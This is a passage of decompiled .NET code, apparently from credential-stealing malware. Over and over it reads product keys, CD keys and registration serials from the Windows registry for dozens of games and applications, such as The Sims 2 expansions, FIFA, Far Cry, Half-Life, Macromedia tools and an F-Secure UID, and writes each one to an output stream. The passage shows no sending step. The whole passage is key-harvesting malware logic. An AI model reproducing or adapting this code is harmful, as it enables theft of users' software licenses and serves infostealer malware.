					goto IL_161a;
					IL_161a:
					num = 320;
					streamWriter.WriteLine(string.Empty);
					goto IL_162d;
					IL_162d:
					num = 321;
					streamWriter.Flush();
					goto IL_163b;
					IL_163b:
					ProjectData.ClearProjectError();
					num3 = -57;
					goto IL_1644;
					IL_1644:
					num = 323;
					text55 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Valve\\Day of Defeat\\Settings", "Key", null));
					goto IL_1662;
					IL_1662:
					num = 324;
					streamWriter.WriteLine("Day of Defeat : " + text55);
					goto IL_167c;
					IL_167c:
					num = 325;
					streamWriter.Flush();
					goto IL_168a;
					IL_168a:
					num = 326;
					streamWriter.WriteLine(string.Empty);
					goto IL_169d;
					IL_169d:
					num = 327;
					streamWriter.Flush();
					goto IL_16ab;
					IL_16ab:
					ProjectData.ClearProjectError();
					num3 = -58;
					goto IL_16b4;
					IL_16b4:
					num = 329;
					text56 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\Electronic Arts\\The Battle for Middle-earth II", "ergc", null));
					goto IL_16d2;
					IL_16d2:
					num = 330;
					streamWriter.WriteLine("The Battle for Middle-earth II : " + text56);
					goto IL_16ec;
					IL_16ec:
					num = 331;
					streamWriter.Flush();
					goto IL_16fa;
					IL_16fa:
					num = 332;
					streamWriter.WriteLine(string.Empty);
					goto IL_170d;
					IL_170d:
					num = 333;
					streamWriter.Flush();
					goto IL_171b;
					IL_171b:
					ProjectData.ClearProjectError();
					num3 = -59;
					goto IL_1724;
					IL_1724:
					num = 335;
					text57 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\The Sims 2", "ergc", null));
					goto IL_1742;
					IL_1742:
					num = 336;
					streamWriter.WriteLine("The Sims 2 : " + text57);
					goto IL_175c;
					IL_175c:
					num = 337;
					streamWriter.Flush();
					goto IL_176a;
					IL_176a:
					num = 338;
					streamWriter.WriteLine(string.Empty);
					goto IL_177d;
					IL_177d:
					num = 339;
					streamWriter.Flush();
					goto IL_178b;
					IL_178b:
					ProjectData.ClearProjectError();
					num3 = -60;
					goto IL_1794;
					IL_1794:
					num = 341;
					text58 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\The Sims 2 University", "ergc", null));
					goto IL_17b2;
					IL_17b2:
					num = 342;
					streamWriter.WriteLine("The Sims 2 University : " + text58);
					goto IL_17cc;
					IL_17cc:
					num = 343;
					streamWriter.Flush();
					goto IL_17da;
					IL_17da:
					num = 344;
					streamWriter.WriteLine(string.Empty);
					goto IL_17ed;
					IL_17ed:
					num = 345;
					streamWriter.Flush();
					goto IL_17fb;
					IL_17fb:
					ProjectData.ClearProjectError();
					num3 = -61;
					goto IL_1804;
					IL_1804:
					num = 347;
					text59 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\The Sims 2 Nightlife", "ergc", null));
					goto IL_1822;
					IL_1822:
					num = 348;
					streamWriter.WriteLine("The Sims 2 Nightlife : " + text59);
					goto IL_183c;
					IL_183c:
					num = 349;
					streamWriter.Flush();
					goto IL_184a;
					IL_184a:
					num = 350;
					streamWriter.WriteLine(string.Empty);
					goto IL_185d;
					IL_185d:
					num = 351;
					streamWriter.Flush();
					goto IL_186b;
					IL_186b:
					ProjectData.ClearProjectError();
					num3 = -62;
					goto IL_1874;
					IL_1874:
					num = 353;
					text60 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\The Sims 2 Open For Business", "ergc", null));
					goto IL_1892;
					IL_1892:
					num = 354;
					streamWriter.WriteLine("The Sims 2 Open For Business : " + text60);
					goto IL_18ac;
					IL_18ac:
					num = 355;
					streamWriter.Flush();
					goto IL_18ba;
					IL_18ba:
					num = 356;
					streamWriter.WriteLine(string.Empty);
					goto IL_18cd;
					IL_18cd:
					num = 357;
					streamWriter.Flush();
					goto IL_18db;
					IL_18db:
					ProjectData.ClearProjectError();
					num3 = -63;
					goto IL_18e4;
					IL_18e4:
					num = 359;
					text61 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\The Sims 2 Pets", "ergc", null));
					goto IL_1902;
					IL_1902:
					num = 360;
					streamWriter.WriteLine("The Sims 2 Pets : " + text61);
					goto IL_191c;
					IL_191c:
					num = 361;
					streamWriter.Flush();
					goto IL_192a;
					IL_192a:
					num = 362;
					streamWriter.WriteLine(string.Empty);
					goto IL_193d;
					IL_193d:
					num = 363;
					streamWriter.Flush();
					goto IL_194b;
					IL_194b:
					ProjectData.ClearProjectError();
					num3 = -64;
					goto IL_1954;
					IL_1954:
					num = 365;
					text62 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\The Sims 2 Seasons", "ergc", null));
					goto IL_1972;
					IL_1972:
					num = 366;
					streamWriter.WriteLine("The Sims 2 Seasons : " + text62);
					goto IL_198c;
					IL_198c:
					num = 367;
					streamWriter.Flush();
					goto IL_199a;
					IL_199a:
					num = 368;
					streamWriter.WriteLine(string.Empty);
					goto IL_19ad;
					IL_19ad:
					num = 369;
					streamWriter.Flush();
					goto IL_19bb;
					IL_19bb:
					ProjectData.ClearProjectError();
					num3 = -65;
					goto IL_19c4;
					IL_19c4:
					num = 371;
					text63 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\The Sims 2 Glamour Life Stuff", "ergc", null));
					goto IL_19e2;
					IL_19e2:
					num = 372;
					streamWriter.WriteLine("The Sims 2 Glamour Life Stuff : " + text63);
					goto IL_19fc;
					IL_19fc:
					num = 373;
					streamWriter.Flush();
					goto IL_1a0a;
					IL_1a0a:
					num = 374;
					streamWriter.WriteLine(string.Empty);
					goto IL_1a1d;
					IL_1a1d:
					num = 375;
					streamWriter.Flush();
					goto IL_1a2b;
					IL_1a2b:
					ProjectData.ClearProjectError();
					num3 = -66;
					goto IL_1a34;
					IL_1a34:
					num = 377;
					text64 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\The Sims 2 Celebration Stuff", "ergc", null));
					goto IL_1a52;
					IL_1a52:
					num = 378;
					streamWriter.WriteLine("The Sims 2 Celebration Stuff : " + text64);
					goto IL_1a6c;
					IL_1a6c:
					num = 379;
					streamWriter.Flush();
					goto IL_1a7a;
					IL_1a7a:
					num = 380;
					streamWriter.WriteLine(string.Empty);
					goto IL_1a8d;
					IL_1a8d:
					num = 381;
					streamWriter.Flush();
					goto IL_1a9b;
					IL_1a9b:
					ProjectData.ClearProjectError();
					num3 = -67;
					goto IL_1aa4;
					IL_1aa4:
					num = 383;
					text65 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\The Sims 2 H M Fashion Stuff", "ergc", null));
					goto IL_1ac2;
					IL_1ac2:
					num = 384;
					streamWriter.WriteLine("The Sims 2 H M Fashion Stuff : " + text65);
					goto IL_1adc;
					IL_1adc:
					num = 385;
					streamWriter.Flush();
					goto IL_1aea;
					IL_1aea:
					num = 386;
					streamWriter.WriteLine(string.Empty);
					goto IL_1afd;
					IL_1afd:
					num = 387;
					streamWriter.Flush();
					goto IL_1b0b;
					IL_1b0b:
					ProjectData.ClearProjectError();
					num3 = -68;
					goto IL_1b14;
					IL_1b14:
					num = 389;
					text66 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\The Sims 2 Family Fun Stuff", "ergc", null));
					goto IL_1b32;
					IL_1b32:
					num = 390;
					streamWriter.WriteLine("The Sims 2 Family Fun Stuff : " + text66);
					goto IL_1b4c;
					IL_1b4c:
					num = 391;
					streamWriter.Flush();
					goto IL_1b5a;
					IL_1b5a:
					num = 392;
					streamWriter.WriteLine(string.Empty);
					goto IL_1b6d;
					IL_1b6d:
					num = 393;
					streamWriter.Flush();
					goto IL_1b7b;
					IL_1b7b:
					ProjectData.ClearProjectError();
					num3 = -69;
					goto IL_1b84;
					IL_1b84:
					num = 395;
					text67 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\DVD Audio Extractor\\Settings", "Reg Name", null));
					goto IL_1ba2;
					IL_1ba2:
					num = 396;
					streamWriter.WriteLine("DVD Audio Extractor (Name) : " + text67);
					goto IL_1bbc;
					IL_1bbc:
					num = 397;
					streamWriter.Flush();
					goto IL_1bca;
					IL_1bca:
					num = 398;
					streamWriter.WriteLine(string.Empty);
					goto IL_1bdd;
					IL_1bdd:
					num = 399;
					streamWriter.Flush();
					goto IL_1beb;
					IL_1beb:
					ProjectData.ClearProjectError();
					num3 = -70;
					goto IL_1bf4;
					IL_1bf4:
					num = 401;
					text68 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\DVD Audio Extractor\\Settings", "Reg Number", null));
					goto IL_1c12;
					IL_1c12:
					num = 402;
					streamWriter.WriteLine("DVD Audio Extractor (Serial) : " + text68);
					goto IL_1c2c;
					IL_1c2c:
					num = 403;
					streamWriter.Flush();
					goto IL_1c3a;
					IL_1c3a:
					num = 404;
					streamWriter.WriteLine(string.Empty);
					goto IL_1c4d;
					IL_1c4d:
					num = 405;
					streamWriter.Flush();
					goto IL_1c5b;
					IL_1c5b:
					ProjectData.ClearProjectError();
					num3 = -71;
					goto IL_1c64;
					IL_1c64:
					num = 407;
					text69 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Sierra\\Empire Earth II", "CDKey", null));
					goto IL_1c82;
					IL_1c82:
					num = 408;
					streamWriter.WriteLine("Empire Earth II : " + text69);
					goto IL_1c9c;
					IL_1c9c:
					num = 409;
					streamWriter.Flush();
					goto IL_1caa;
					IL_1caa:
					num = 410;
					streamWriter.WriteLine(string.Empty);
					goto IL_1cbd;
					IL_1cbd:
					num = 411;
					streamWriter.Flush();
					goto IL_1ccb;
					IL_1ccb:
					ProjectData.ClearProjectError();
					num3 = -72;
					goto IL_1cd4;
					IL_1cd4:
					num = 413;
					text70 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Sierra\\CDKey", "fear", null));
					goto IL_1cf2;
					IL_1cf2:
					num = 414;
					streamWriter.WriteLine("F.E.A.R : " + text70);
					goto IL_1d0c;
					IL_1d0c:
					num = 415;
					streamWriter.Flush();
					goto IL_1d1a;
					IL_1d1a:
					num = 416;
					streamWriter.WriteLine(string.Empty);
					goto IL_1d2d;
					IL_1d2d:
					num = 417;
					streamWriter.Flush();
					goto IL_1d3b;
					IL_1d3b:
					ProjectData.ClearProjectError();
					num3 = -73;
					goto IL_1d44;
					IL_1d44:
					num = 419;
					text71 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\F-Secure\\BackWeb\\iLauncher", "UID", null));
					goto IL_1d62;
					IL_1d62:
					num = 420;
					streamWriter.WriteLine("F-Secure : " + text71);
					goto IL_1d7c;
					IL_1d7c:
					num = 421;
					streamWriter.Flush();
					goto IL_1d8a;
					IL_1d8a:
					num = 422;
					streamWriter.WriteLine(string.Empty);
					goto IL_1d9d;
					IL_1d9d:
					num = 423;
					streamWriter.Flush();
					goto IL_1dab;
					IL_1dab:
					ProjectData.ClearProjectError();
					num3 = -74;
					goto IL_1db4;
					IL_1db4:
					num = 425;
					text72 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\CRYTEK\\FARCRY\\UBI.COM", "CDKey", null));
					goto IL_1dd2;
					IL_1dd2:
					num = 426;
					streamWriter.WriteLine("FARCRY : " + text72);
					goto IL_1dec;
					IL_1dec:
					num = 427;
					streamWriter.Flush();
					goto IL_1dfa;
					IL_1dfa:
					num = 428;
					streamWriter.WriteLine(string.Empty);
					goto IL_1e0d;
					IL_1e0d:
					num = 429;
					streamWriter.Flush();
					goto IL_1e1b;
					IL_1e1b:
					ProjectData.ClearProjectError();
					num3 = -75;
					goto IL_1e24;
					IL_1e24:
					num = 431;
					text73 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\CRYTEK\\FARCRY2\\UBI.COM", "CDKey", null));
					goto IL_1e42;
					IL_1e42:
					num = 432;
					streamWriter.WriteLine("FARCRY 2 : " + text73);
					goto IL_1e5c;
					IL_1e5c:
					num = 433;
					streamWriter.Flush();
					goto IL_1e6a;
					IL_1e6a:
					num = 434;
					streamWriter.WriteLine(string.Empty);
					goto IL_1e7d;
					IL_1e7d:
					num = 435;
					streamWriter.Flush();
					goto IL_1e8b;
					IL_1e8b:
					ProjectData.ClearProjectError();
					num3 = -76;
					goto IL_1e94;
					IL_1e94:
					num = 437;
					text74 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Sports\\FIFA 2002", "ergc", null));
					goto IL_1eb2;
					IL_1eb2:
					num = 438;
					streamWriter.WriteLine("FIFA 2002 : " + text74);
					goto IL_1ecc;
					IL_1ecc:
					num = 439;
					streamWriter.Flush();
					goto IL_1eda;
					IL_1eda:
					num = 440;
					streamWriter.WriteLine(string.Empty);
					goto IL_1eed;
					IL_1eed:
					num = 441;
					streamWriter.Flush();
					goto IL_1efb;
					IL_1efb:
					ProjectData.ClearProjectError();
					num3 = -77;
					goto IL_1f04;
					IL_1f04:
					num = 443;
					text75 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Sports\\FIFA 2003", "ergc", null));
					goto IL_1f22;
					IL_1f22:
					num = 444;
					streamWriter.WriteLine("FIFA 2003 : " + text75);
					goto IL_1f3c;
					IL_1f3c:
					num = 445;
					streamWriter.Flush();
					goto IL_1f4a;
					IL_1f4a:
					num = 446;
					streamWriter.WriteLine(string.Empty);
					goto IL_1f5d;
					IL_1f5d:
					num = 447;
					streamWriter.Flush();
					goto IL_1f6b;
					IL_1f6b:
					ProjectData.ClearProjectError();
					num3 = -78;
					goto IL_1f74;
					IL_1f74:
					num = 449;
					text76 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Sports\\FIFA 2004", "ergc", null));
					goto IL_1f92;
					IL_1f92:
					num = 450;
					streamWriter.WriteLine("FIFA 2004 : " + text76);
					goto IL_1fac;
					IL_1fac:
					num = 451;
					streamWriter.Flush();
					goto IL_1fba;
					IL_1fba:
					num = 452;
					streamWriter.WriteLine(string.Empty);
					goto IL_1fcd;
					IL_1fcd:
					num = 453;
					streamWriter.Flush();
					goto IL_1fdb;
					IL_1fdb:
					ProjectData.ClearProjectError();
					num3 = -79;
					goto IL_1fe4;
					IL_1fe4:
					num = 455;
					text77 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Sports\\FIFA 2005", "ergc", null));
					goto IL_2002;
					IL_2002:
					num = 456;
					streamWriter.WriteLine("FIFA 2005 : " + text77);
					goto IL_201c;
					IL_201c:
					num = 457;
					streamWriter.Flush();
					goto IL_202a;
					IL_202a:
					num = 458;
					streamWriter.WriteLine(string.Empty);
					goto IL_203d;
					IL_203d:
					num = 459;
					streamWriter.Flush();
					goto IL_204b;
					IL_204b:
					ProjectData.ClearProjectError();
					num3 = -80;
					goto IL_2054;
					IL_2054:
					num = 461;
					text78 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Sports\\FIFA 07", "ergc", null));
					goto IL_2072;
					IL_2072:
					num = 462;
					streamWriter.WriteLine("FIFA 07 : " + text78);
					goto IL_208c;
					IL_208c:
					num = 463;
					streamWriter.Flush();
					goto IL_209a;
					IL_209a:
					num = 464;
					streamWriter.WriteLine(string.Empty);
					goto IL_20ad;
					IL_20ad:
					num = 465;
					streamWriter.Flush();
					goto IL_20bb;
					IL_20bb:
					ProjectData.ClearProjectError();
					num3 = -81;
					goto IL_20c4;
					IL_20c4:
					num = 467;
					text79 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\Electronic Arts\\FIFA 08", "ergc", null));
					goto IL_20e2;
					IL_20e2:
					num = 468;
					streamWriter.WriteLine("FIFA 08 : " + text79);
					goto IL_20fc;
					IL_20fc:
					num = 469;
					streamWriter.Flush();
					goto IL_210a;
					IL_210a:
					num = 470;
					streamWriter.WriteLine(string.Empty);
					goto IL_211d;
					IL_211d:
					num = 471;
					streamWriter.Flush();
					goto IL_212b;
					IL_212b:
					ProjectData.ClearProjectError();
					num3 = -82;
					goto IL_2134;
					IL_2134:
					num = 473;
					text80 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Distribution\\Freedom Force", "ergc", null));
					goto IL_2152;
					IL_2152:
					num = 474;
					streamWriter.WriteLine("Freedom Force : " + text80);
					goto IL_216c;
					IL_216c:
					num = 475;
					streamWriter.Flush();
					goto IL_217a;
					IL_217a:
					num = 476;
					streamWriter.WriteLine(string.Empty);
					goto IL_218d;
					IL_218d:
					num = 477;
					streamWriter.Flush();
					goto IL_219b;
					IL_219b:
					ProjectData.ClearProjectError();
					num3 = -83;
					goto IL_21a4;
					IL_21a4:
					num = 479;
					text81 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\THQ\\Frontlines: Fuel of War Beta", "ProductKey", null));
					goto IL_21c2;
					IL_21c2:
					num = 480;
					streamWriter.WriteLine("Frontlines Fuel of War Beta : " + text81);
					goto IL_21dc;
					IL_21dc:
					num = 481;
					streamWriter.Flush();
					goto IL_21ea;
					IL_21ea:
					num = 482;
					streamWriter.WriteLine(string.Empty);
					goto IL_21fd;
					IL_21fd:
					num = 483;
					streamWriter.Flush();
					goto IL_220b;
					IL_220b:
					ProjectData.ClearProjectError();
					num3 = -84;
					goto IL_2214;
					IL_2214:
					num = 485;
					text82 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\THQ\\Frontlines: Fuel of War", "ProductKey", null));
					goto IL_2232;
					IL_2232:
					num = 486;
					streamWriter.WriteLine("Frontlines: Fuel of War : " + text82);
					goto IL_224c;
					IL_224c:
					num = 487;
					streamWriter.Flush();
					goto IL_225a;
					IL_225a:
					num = 488;
					streamWriter.WriteLine(string.Empty);
					goto IL_226d;
					IL_226d:
					num = 489;
					streamWriter.Flush();
					goto IL_227b;
					IL_227b:
					ProjectData.ClearProjectError();
					num3 = -85;
					goto IL_2284;
					IL_2284:
					num = 491;
					text83 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Headlight\\GetRight", "GRcode", null));
					goto IL_22a2;
					IL_22a2:
					num = 492;
					streamWriter.WriteLine("GetRight : " + text83);
					goto IL_22bc;
					IL_22bc:
					num = 493;
					streamWriter.Flush();
					goto IL_22ca;
					IL_22ca:
					num = 494;
					streamWriter.WriteLine(string.Empty);
					goto IL_22dd;
					IL_22dd:
					num = 495;
					streamWriter.Flush();
					goto IL_22eb;
					IL_22eb:
					ProjectData.ClearProjectError();
					num3 = -86;
					goto IL_22f4;
					IL_22f4:
					num = 497;
					text84 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA GAMES\\Global Operations", "ergc", null));
					goto IL_2312;
					IL_2312:
					num = 498;
					streamWriter.WriteLine("Global Operations : " + text84);
					goto IL_232c;
					IL_232c:
					num = 499;
					streamWriter.Flush();
					goto IL_233a;
					IL_233a:
					num = 500;
					streamWriter.WriteLine(string.Empty);
					goto IL_234d;
					IL_234d:
					num = 501;
					streamWriter.Flush();
					goto IL_235b;
					IL_235b:
					ProjectData.ClearProjectError();
					num3 = -87;
					goto IL_2364;
					IL_2364:
					num = 503;
					text85 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Valve\\Gunman", "Settings", null));
					goto IL_2382;
					IL_2382:
					num = 504;
					streamWriter.WriteLine("Gunman : " + text85);
					goto IL_239c;
					IL_239c:
					num = 505;
					streamWriter.Flush();
					goto IL_23aa;
					IL_23aa:
					num = 506;
					streamWriter.WriteLine(string.Empty);
					goto IL_23bd;
					IL_23bd:
					num = 507;
					streamWriter.Flush();
					goto IL_23cb;
					IL_23cb:
					ProjectData.ClearProjectError();
					num3 = -88;
					goto IL_23d4;
					IL_23d4:
					num = 509;
					text86 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Valve\\Half-Life\\Setting", "Key", null));
					goto IL_23f2;
					IL_23f2:
					num = 510;
					streamWriter.WriteLine("Half-Life : " + text86);
					goto IL_240c;
					IL_240c:
					num = 511;
					streamWriter.Flush();
					goto IL_241a;
					IL_241a:
					num = 512;
					streamWriter.WriteLine(string.Empty);
					goto IL_242d;
					IL_242d:
					num = 513;
					streamWriter.Flush();
					goto IL_243b;
					IL_243b:
					ProjectData.ClearProjectError();
					num3 = -89;
					goto IL_2444;
					IL_2444:
					num = 515;
					text87 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\Hellgate: London", "ergc", null));
					goto IL_2462;
					IL_2462:
					num = 516;
					streamWriter.WriteLine("Hellgate London : " + text87);
					goto IL_247c;
					IL_247c:
					num = 517;
					streamWriter.Flush();
					goto IL_248a;
					IL_248a:
					num = 518;
					streamWriter.WriteLine(string.Empty);
					goto IL_249d;
					IL_249d:
					num = 519;
					streamWriter.Flush();
					goto IL_24ab;
					IL_24ab:
					ProjectData.ClearProjectError();
					num3 = -90;
					goto IL_24b4;
					IL_24b4:
					num = 521;
					text88 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Illusion Softworks\\Hidden & Dangerous 2", "key", null));
					goto IL_24d2;
					IL_24d2:
					num = 522;
					streamWriter.WriteLine("Hidden & Dangerous 2 : " + text88);
					goto IL_24ec;
					IL_24ec:
					num = 523;
					streamWriter.Flush();
					goto IL_24fa;
					IL_24fa:
					num = 524;
					streamWriter.WriteLine(string.Empty);
					goto IL_250d;
					IL_250d:
					num = 525;
					streamWriter.Flush();
					goto IL_251b;
					IL_251b:
					ProjectData.ClearProjectError();
					num3 = -91;
					goto IL_2524;
					IL_2524:
					num = 527;
					text89 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\IGI 2 Retail\\CDKey", "CDkey", null));
					goto IL_2542;
					IL_2542:
					num = 528;
					streamWriter.WriteLine("IGI 2 Retail : " + text89);
					goto IL_255c;
					IL_255c:
					num = 529;
					streamWriter.Flush();
					goto IL_256a;
					IL_256a:
					num = 530;
					streamWriter.WriteLine(string.Empty);
					goto IL_257d;
					IL_257d:
					num = 531;
					streamWriter.Flush();
					goto IL_258b;
					IL_258b:
					ProjectData.ClearProjectError();
					num3 = -92;
					goto IL_2594;
					IL_2594:
					num = 533;
					text90 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Ahead\\InCD", "License", null));
					goto IL_25b2;
					IL_25b2:
					num = 534;
					streamWriter.WriteLine("InCD Serial : " + text90);
					goto IL_25cc;
					IL_25cc:
					num = 535;
					streamWriter.Flush();
					goto IL_25da;
					IL_25da:
					num = 536;
					streamWriter.WriteLine(string.Empty);
					goto IL_25ed;
					IL_25ed:
					num = 537;
					streamWriter.Flush();
					goto IL_25fb;
					IL_25fb:
					ProjectData.ClearProjectError();
					num3 = -93;
					goto IL_2604;
					IL_2604:
					num = 539;
					text91 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\JoWooD\\InstalledGames\\IG2", "prvkey", null));
					goto IL_2622;
					IL_2622:
					num = 540;
					streamWriter.WriteLine("IG2 : " + text91);
					goto IL_263c;
					IL_263c:
					num = 541;
					streamWriter.Flush();
					goto IL_264a;
					IL_264a:
					num = 542;
					streamWriter.WriteLine(string.Empty);
					goto IL_265d;
					IL_265d:
					num = 543;
					streamWriter.Flush();
					goto IL_266b;
					IL_266b:
					ProjectData.ClearProjectError();
					num3 = -94;
					goto IL_2674;
					IL_2674:
					num = 545;
					text92 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\AVConverter\\iPod Converter", "Registration Code", null));
					goto IL_2692;
					IL_2692:
					num = 546;
					streamWriter.WriteLine("iPod Converter (Registration Code) : " + text92);
					goto IL_26ac;
					IL_26ac:
					num = 547;
					streamWriter.Flush();
					goto IL_26ba;
					IL_26ba:
					num = 548;
					streamWriter.WriteLine(string.Empty);
					goto IL_26cd;
					IL_26cd:
					num = 549;
					streamWriter.Flush();
					goto IL_26db;
					IL_26db:
					ProjectData.ClearProjectError();
					num3 = -95;
					goto IL_26e4;
					IL_26e4:
					num = 551;
					text93 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\AVConverter\\iPod Converter", "User Name", null));
					goto IL_2702;
					IL_2702:
					num = 552;
					streamWriter.WriteLine("iPod Converter (User Name) : " + text93);
					goto IL_271c;
					IL_271c:
					num = 553;
					streamWriter.Flush();
					goto IL_272a;
					IL_272a:
					num = 554;
					streamWriter.WriteLine(string.Empty);
					goto IL_273d;
					IL_273d:
					num = 555;
					streamWriter.Flush();
					goto IL_274b;
					IL_274b:
					ProjectData.ClearProjectError();
					num3 = -96;
					goto IL_2754;
					IL_2754:
					num = 557;
					text94 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA GAMES\\James Bond 007 Nightfire", "ergc", null));
					goto IL_2772;
					IL_2772:
					num = 558;
					streamWriter.WriteLine("James Bond 007 Nightfire : " + text94);
					goto IL_278c;
					IL_278c:
					num = 559;
					streamWriter.Flush();
					goto IL_279a;
					IL_279a:
					num = 560;
					streamWriter.WriteLine(string.Empty);
					goto IL_27ad;
					IL_27ad:
					num = 561;
					streamWriter.Flush();
					goto IL_27bb;
					IL_27bb:
					ProjectData.ClearProjectError();
					num3 = -97;
					goto IL_27c4;
					IL_27c4:
					num = 563;
					text95 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\3d0\\Status Legends of Might and Magic", "CustomerNumber", null));
					goto IL_27e2;
					IL_27e2:
					num = 564;
					streamWriter.WriteLine("Status Legends of Might and Magic : " + text95);
					goto IL_27fc;
					IL_27fc:
					num = 565;
					streamWriter.Flush();
					goto IL_280a;
					IL_280a:
					num = 566;
					streamWriter.WriteLine(string.Empty);
					goto IL_281d;
					IL_281d:
					num = 567;
					streamWriter.Flush();
					goto IL_282b;
					IL_282b:
					ProjectData.ClearProjectError();
					num3 = -98;
					goto IL_2834;
					IL_2834:
					num = 569;
					text96 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Macromedia\\Flash\\7\\Registration", "Serial Number", null));
					goto IL_2852;
					IL_2852:
					num = 570;
					streamWriter.WriteLine("Macromedia Flash 7 : " + text96);
					goto IL_286c;
					IL_286c:
					num = 571;
					streamWriter.Flush();
					goto IL_287a;
					IL_287a:
					num = 572;
					streamWriter.WriteLine(string.Empty);
					goto IL_288d;
					IL_288d:
					num = 573;
					streamWriter.Flush();
					goto IL_289b;
					IL_289b:
					ProjectData.ClearProjectError();
					num3 = -99;
					goto IL_28a4;
					IL_28a4:
					num = 575;
					text97 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Macromedia\\Fireworks\\7\\Registration", "Serial Number", null));
					goto IL_28c2;
					IL_28c2:
					num = 576;
					streamWriter.WriteLine("Macromedia Fireworks 7 : " + text97);
					goto IL_28dc;
					IL_28dc:
					num = 577;
					streamWriter.Flush();
					goto IL_28ea;
					IL_28ea:
					num = 578;
					streamWriter.WriteLine(string.Empty);
					goto IL_28fd;
					IL_28fd:
					num = 579;
					streamWriter.Flush();
					goto IL_290b;
					IL_290b:
					ProjectData.ClearProjectError();
					num3 = -100;
					goto IL_2914;
					IL_2914:
					num = 581;
					text98 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Macromedia\\Dreamweaver\\7\\Registration", "Serial Number", null));
					goto IL_2932;
					IL_2932:
					num = 582;
					streamWriter.WriteLine("Macromedia Dreamweaver 7 : " + text98);
					goto IL_294c;
					IL_294c:
					num = 583;
					streamWriter.Flush();
					goto IL_295a;
					IL_295a:
					num = 584;
					streamWriter.WriteLine(string.Empty);
					goto IL_296d;
					IL_296d:
					num = 585;
					streamWriter.Flush();
					goto IL_297b;
					IL_297b:
					ProjectData.ClearProjectError();
					num3 = -101;
					goto IL_2984;
					IL_2984:
					num = 587;
					text99 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Sports\\Madden NFL 07", "ergc", null));
					goto IL_29a2;
					IL_29a2:
					num = 588;
					streamWriter.WriteLine("Madden NFL 07 : " + text99);
					goto IL_29bc;
					IL_29bc:
					num = 589;
					streamWriter.Flush();
					goto IL_29ca;
					IL_29ca:
					num = 590;
					streamWriter.WriteLine(string.Empty);
					goto IL_29dd;
					IL_29dd:
					num = 591;
					streamWriter.Flush();
					goto IL_29eb;
					IL_29eb:
					ProjectData.ClearProjectError();
